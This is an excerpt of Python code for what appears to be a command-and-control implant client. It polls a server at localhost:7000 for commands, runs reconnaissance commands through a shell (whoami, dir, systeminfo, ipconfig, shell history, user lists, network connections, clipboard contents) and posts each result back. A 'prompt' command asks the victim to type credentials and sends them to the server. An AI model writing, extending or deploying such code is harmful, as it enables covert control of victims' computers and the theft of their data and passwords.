...
async def main():
    ...
    async with aiohttp.ClientSession() as session:
        ...
        async with session.get('http://localhost:7000/validate/status') as resp:
            ...
            for command in cmds:
                ...
                if command == "pwd" or command == "cd":
                    ...
                    await session.post('http://localhost:7000/validate/status/3', data=result.stdout)
                
                if command == "whoami":

                    result = run('whoami', stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)

                    await session.post('http://localhost:7000/validate/status/13', data=result.stdout)

                if command == "ls":

                    result = run('dir', stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)

                    await session.post('http://localhost:7000/validate/status/5', data=result.stdout)
                ...
                if command == "systeminfo":
                    ...
                    await session.post('http://localhost:7000/validate/status/14', data=result.stdout)
                ...
                if 'cat' in command and command != "cat":
                    ...
                    await session.post('http://localhost:7000/validate/status/15', data=result.stdout)
                ...
                if command == "listusers":
                    ...
                    await session.post('http://localhost:7000/validate/status/10', data=result.stdout)
                ...
                if command == "ipconfig":
                    ...
                    await session.post('http://localhost:7000/validate/status/9', data=result.stdout)
                ...
                if command == "clipboard":
                    ...
                    await session.post('http://localhost:7000/validate/status/6', data=result.stdout)
                ...
                if command == "connections":
                    ...
                    await session.post('http://localhost:7000/validate/status/8', data=result.stdout)


                if command == "prompt":

                    promptData = input(" Enter some credentials here : ")
                    await session.post('http://localhost:7000/validate/status/7', data=promptData)


                if command == "userhist":

                    result = run('doskey /history', stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
                    await session.post('http://localhost:7000/validate/status/11', data=result.stdout)
